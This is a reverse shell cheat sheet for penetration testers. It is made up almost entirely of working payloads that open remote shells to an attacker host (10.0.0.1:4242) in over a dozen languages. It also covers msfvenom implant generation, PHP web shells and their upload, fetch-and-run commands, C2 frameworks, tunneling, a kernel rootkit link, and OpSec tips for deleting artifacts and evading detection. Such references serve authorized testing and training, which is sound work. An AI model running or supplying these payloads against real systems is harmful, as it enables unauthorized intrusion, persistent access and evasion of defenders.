# Reverse Shell Cheat Sheet

A practical guide for penetration testers covering common reverse shell payloads and modern handling tools.

## Quick Start

**Set up your listener:**
```bash
nc -lvnp 4242
# Or with rlwrap for better shell handling
rlwrap nc -lvnp 4242
```

**Replace these in all examples:**
- `10.0.0.1` → Your IP address
- `4242` → Your listening port

---

## Modern Shell Handlers (Recommended)

### Penelope
**Automated shell handling with auto-upgrade, file transfer, and more**

```bash
# Installation
git clone https://github.com/brightio/penelope.git
cd penelope && chmod +x penelope.py

# Basic listener
python3 penelope.py 4242

# With auto-upgrade
python3 penelope.py -i eth0 4242

# Multiple sessions
python3 penelope.py -i eth0 4242 4243 4244

# Upload binary on connect
python3 penelope.py 4242 -u linpeas.sh

# Interactive mode with menu
python3 penelope.py -i eth0
```

**Features:**
- Auto-upgrade to PTY
- Tab completion
- Built-in file upload/download
- Session management
- Port forwarding
- Script execution on connect

### RustScan + nc
```bash
# Modern port scanner with shell handler
rustscan -a 10.0.0.1 -- -A
```

### xc (Secure Reverse Shell)
**Encrypted reverse shell with modern crypto**

```bash
# Installation
go install github.com/xct/xc@latest

# Listener (Server)
xc -l -p 4242

# Client (Victim - Linux)
./xc 10.0.0.1:4242

# Client (Victim - Windows)
xc.exe 10.0.0.1:4242
```

**Features:**
- AES-256-GCM encryption
- No dependencies
- Cross-platform (Linux, Windows, macOS)
- Tiny binaries (~500KB)
- Built-in file transfer

**Download precompiled:**
```bash
# Get latest release from GitHub
wget https://github.com/xct/xc/releases/latest/download/xc_linux_amd64 -O xc
chmod +x xc
```

### reverse_ssh
**Full SSH server tunneled through reverse connection**

```bash
# Installation
go install github.com/Fahrj/reverse-ssh/cmd/reverse-ssh@latest

# Or download precompiled
wget https://github.com/NHAS/reverse_ssh/releases/latest/download/server
wget https://github.com/NHAS/reverse_ssh/releases/latest/download/client

# Server (Attacker)
./server -p 2222

# Client (Victim)
./client -d 10.0.0.1:2222

# Connect to victim
ssh -p 2222 127.0.0.1
```

**Features:**
- Full SSH capabilities
- SCP support
- SOCKS proxy
- Port forwarding
- Multiple sessions
- Persistence

### sliver
**Modern C2 framework with reverse shells**

```bash
# Installation
curl https://sliver.sh/install|sudo bash

# Start server
sliver-server

# Generate implant
generate --mtls 10.0.0.1:443 --os linux

# Or HTTP beacon
generate beacon --http 10.0.0.1:80
```

### pwncat-cs
**Enhanced reverse shell handler with automation**

```bash
# Installation
pip3 install pwncat-cs

# Basic listener
pwncat-cs -lp 4242

# With platform detection
pwncat-cs -l -p 4242 --platform linux

# Bind shell
pwncat-cs 10.0.0.1:4242
```

**Features:**
- Automatic PTY upgrade
- File upload/download
- Persistence modules
- Privilege escalation helpers
- Command history across sessions

### rustcat (rcat)
**Modern netcat with auto-upgrade**

```bash
# Installation
cargo install rustcat
# Or download from https://github.com/robiot/rustcat/releases

# Listener with auto-upgrade
rcat listen -ie "/usr/bin/script -qc /bin/bash /dev/null" 4242

# Standard listener
rcat listen 4242

# Connect
rcat connect 10.0.0.1 4242
```

### Villain
**Modern C2 with web GUI**

```bash
# Installation
git clone https://github.com/t3l3machus/Villain.git
cd Villain
pip3 install -r requirements.txt

# Start
python3 Villain.py

# Access web interface at https://127.0.0.1:6969
```

**Features:**
- Web-based GUI
- Session management
- File browser
- Built-in shells
- HTTPS by default

### Havoc C2
**Modern C2 framework (Cobalt Strike alternative)**

```bash
# Installation
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make

# Start teamserver
./havoc server --profile ./profiles/havoc.yaotl

# Start client
./havoc client
```

---

## Bash

### TCP
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

# Alternative
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1

# Another variant
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

### UDP
```bash
# Victim
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

# Listener
nc -u -lvnp 4242
```

---

## Python

### Standard (with PTY)
```python
export RHOST="10.0.0.1";export RPORT=4242;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Short version
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### IPv6
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## PHP

```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/bash -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/bash -i",array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

---

## Netcat

### Traditional
```bash
nc -e /bin/bash 10.0.0.1 4242
```

### OpenBSD
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### BusyBox
```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### Ncat
```bash
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

---

## Socat

### Listener (Attacker)
```bash
socat file:`tty`,raw,echo=0 TCP-L:4242
```

### Client (Victim)
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

# Download and execute
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

### Encrypted (SSL/TLS)
```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener
socat OPENSSL-LISTEN:4242,cert=shell.pem,verify=0,fork STDIO

# Client
socat OPENSSL:10.0.0.1:4242,verify=0 EXEC:/bin/bash
```

---

## Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

---

## Node.js

```javascript
require('child_process').exec('nc -e /bin/bash 10.0.0.1 4242')

// Alternative
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## PowerShell

### One-liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### ConPtyShell (Fully Interactive - Windows 10+)
```powershell
# Listener
stty raw -echo; (stty size; cat) | nc -lvnp 4242

# Victim
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.1 4242
```

---

## Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

---

## OpenSSL

### Standard
```bash
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4242

# Victim
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

### TLS-PSK (No PKI required)
```bash
# Generate PSK
openssl rand -hex 48

# Listener
export LHOST="*"; export LPORT="4242"; export PSK="<generated_psk>"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT

# Victim
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="<generated_psk>"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/bash -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

---

## Additional Languages

### Lua
```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

### Golang
```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Rust
```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

### AWK
```bash
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## TTY Shell Upgrade

### Method 1: Python PTY (Most Common)
```bash
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c "__import__('pty').spawn('/bin/bash')"

# Background the shell (Ctrl+Z)
^Z

# On your local machine (get terminal size first)
echo $TERM  # note this
stty size   # note rows and cols
stty raw -echo; fg

# In the shell (press Enter twice)
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### Method 2: Script Command
```bash
# If 'su' requires a TTY
/usr/bin/script -qc /bin/bash /dev/null

# Alternative
script -q /dev/null -c bash
```

### Method 3: Socat (Best Quality)
```bash
# Transfer socat to victim
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat

# Listener
socat file:`tty`,raw,echo=0 tcp-listen:4242

# Victim
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

### Method 4: Other Interpreters
```bash
perl -e 'exec "/bin/bash";'
ruby: exec "/bin/bash"
lua: os.execute('/bin/bash')
```

### Method 5: Expect
```bash
expect -c 'spawn /bin/bash; interact'
```

### Get Terminal Size
```bash
# On your machine
stty size
# Example output: 24 80

# In reverse shell after upgrade
stty rows 24 columns 80
```

---

## Web Shells

### weevely (PHP)
```bash
# Generate
weevely generate password /tmp/shell.php

# Connect
weevely http://target.com/shell.php password
```

### PHP Web Shell (Simple)
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

### Upload via curl
```bash
curl -X POST -F "file=@shell.php" http://target.com/upload.php
```

---

## Msfvenom Payloads

### Linux
```bash
# Staged
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf > shell.elf

# Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf > shell.elf
```

### Windows
```bash
# Staged
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > shell.exe

# Stageless
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > shell.exe
```

### Web Shells
```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f asp > shell.asp
```

### macOS
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f macho > shell.macho
```

---

## Pivoting & Tunneling Tools

### Chisel
```bash
# Installation
go install github.com/jpillora/chisel@latest

# Server (Attacker)
chisel server -p 8080 --reverse

# Client (Victim)
chisel client 10.0.0.1:8080 R:4242:127.0.0.1:4242
```

### ligolo-ng (Modern VPN-like)
```bash
# Download from https://github.com/nicocha30/ligolo-ng/releases

# Server (Attacker)
./proxy -selfcert

# Agent (Victim)
./agent -connect 10.0.0.1:11601 -ignore-cert
```

### SSH Tunneling
```bash
# Local port forward
ssh -L 8080:localhost:80 user@target

# Remote port forward (reverse tunnel)
ssh -R 4242:localhost:4242 user@attacker

# Dynamic SOCKS proxy
ssh -D 1080 user@target
```

### sshuttle
```bash
# VPN over SSH
sshuttle -r user@target 10.0.0.0/24
```

---

## Shell Stabilization Tools

### reptile (Advanced)
```bash
# Kernel-level rootkit with reverse shell
git clone https://github.com/f0rb1dd3n/Reptile.git
```

### GTFOBins / LOLBins
```bash
# Use legitimate binaries for shells
# GTFOBins: https://gtfobins.github.io/
# LOLBAS: https://lolbas-project.github.io/
```

---

## Modern Tool Comparison

| Tool | Auto-Upgrade | Encryption | File Transfer | Multi-Session | Learning Curve |
|------|-------------|------------|---------------|---------------|----------------|
| **Penelope** | ✅ | ❌ | ✅ | ✅ | Easy |
| **xc** | ❌ | ✅ | ✅ | ❌ | Easy |
| **reverse_ssh** | ✅ | ✅ | ✅ | ✅ | Medium |
| **pwncat-cs** | ✅ | ❌ | ✅ | ✅ | Medium |
| **Sliver** | ✅ | ✅ | ✅ | ✅ | Medium |
| **Villain** | ✅ | ✅ | ✅ | ✅ | Easy |
| **Havoc** | ✅ | ✅ | ✅ | ✅ | Hard |
| **rustcat** | ✅ | ❌ | ❌ | ❌ | Easy |

---

## Installation Quick Reference

```bash
# Penelope
git clone https://github.com/brightio/penelope.git

# xc
go install github.com/xct/xc@latest

# reverse_ssh
go install github.com/NHAS/reverse_ssh@latest

# pwncat-cs
pip3 install pwncat-cs

# rustcat
cargo install rustcat

# Chisel
go install github.com/jpillora/chisel@latest

# Sliver
curl https://sliver.sh/install|sudo bash

# ligolo-ng
# Download from GitHub releases
```

---

## Enhanced Listeners

```bash
# rlwrap (command history and editing)
rlwrap nc -lvnp 4242
rlwrap -cAr ncat -lvnp 4242

# pwncat (automatic upgrades)
pwncat-cs -lp 4242

# rustcat (automatic TTY upgrade)
rcat listen -ie "/usr/bin/script -qc /bin/bash /dev/null" 4242

# Penelope (full automation)
python3 penelope.py 4242

# xc (encrypted)
xc -l -p 4242
```

---

## File Transfer Methods

### From Reverse Shell

```bash
# wget
wget http://10.0.0.1:8000/file

# curl
curl http://10.0.0.1:8000/file -o file

# Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.0.0.1:8000/file", "file")'

# nc
nc -lvnp 4242 < file  # sender
nc 10.0.0.1 4242 > file  # receiver

# Base64 (for small files)
echo "base64data" | base64 -d > file
```

### Host Files

```bash
# Python HTTP server
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000

# updog (better than Python)
pip3 install updog
updog -p 8000
```

---

## Tips & Best Practices

### Listener Priority
1. **Penelope** - Best for quick pentests with auto-upgrade
2. **xc** - When you need encryption
3. **reverse_ssh** - For long-term access and tunneling
4. **pwncat-cs** - For automation and enumeration
5. **rlwrap + nc** - Classic fallback

### Payload Priority
1. **Bash TCP** - Try first (works on most Linux)
2. **Python** - Second choice (usually installed)
3. **Netcat variants** - Check which version is available
4. **Compiled binaries** - Last resort (xc, reverse_ssh)

### Stabilization Checklist
- [ ] Upgrade to PTY
- [ ] Set proper TERM and SHELL variables
- [ ] Adjust terminal size
- [ ] Test tab completion
- [ ] Test Ctrl+C handling
- [ ] Verify background/foreground works

### OpSec Considerations
- Use encrypted shells (xc, reverse_ssh, OpenSSL)
- Delete artifacts after use
- Use common ports (80, 443, 53)
- Consider DNS tunneling for egress
- Use legitimate tools when possible (GTFOBins)

---

## Useful One-Liners

### Check for Python
```bash
which python python2 python3
```

### Find SUID binaries
```bash
find / -perm -4000 2>/dev/null
```

### Check capabilities
```bash
getcap -r / 2>/dev/null
```

### Current user info
```bash
id; whoami; groups; uname -a
```

---

## Resources & References

### Tools
- [Penelope](https://github.com/brightio/penelope) - Shell handler with auto-upgrade
- [xc](https://github.com/xct/xc) - Encrypted reverse shell
- [reverse_ssh](https://github.com/NHAS/reverse_ssh) - SSH over reverse connection
- [pwncat-cs](https://github.com/calebstewart/pwncat) - Advanced shell handler
- [rustcat](https://github.com/robiot/rustcat) - Modern netcat
- [Villain](https://github.com/t3l3machus/Villain) - Web-based C2
- [Sliver](https://github.com/BishopFox/sliver) - Modern C2 framework
- [Havoc](https://github.com/HavocFramework/Havoc) - C2 framework
- [Chisel](https://github.com/jpillora/chisel) - TCP/UDP tunnel
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) - Tunneling tool

### Online Generators
- [revshells.com](https://www.revshells.com/) - Reverse shell generator
- [reverse-shell-generator](https://github.com/cwinfosec/revshellgen) - CLI generator

### Learning Resources
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)
- [IppSec Shells Tutorial](https://www.youtube.com/watch?v=DLzxrzFCOe4)

---

## License
This cheat sheet is for educational and authorized penetration testing purposes only.
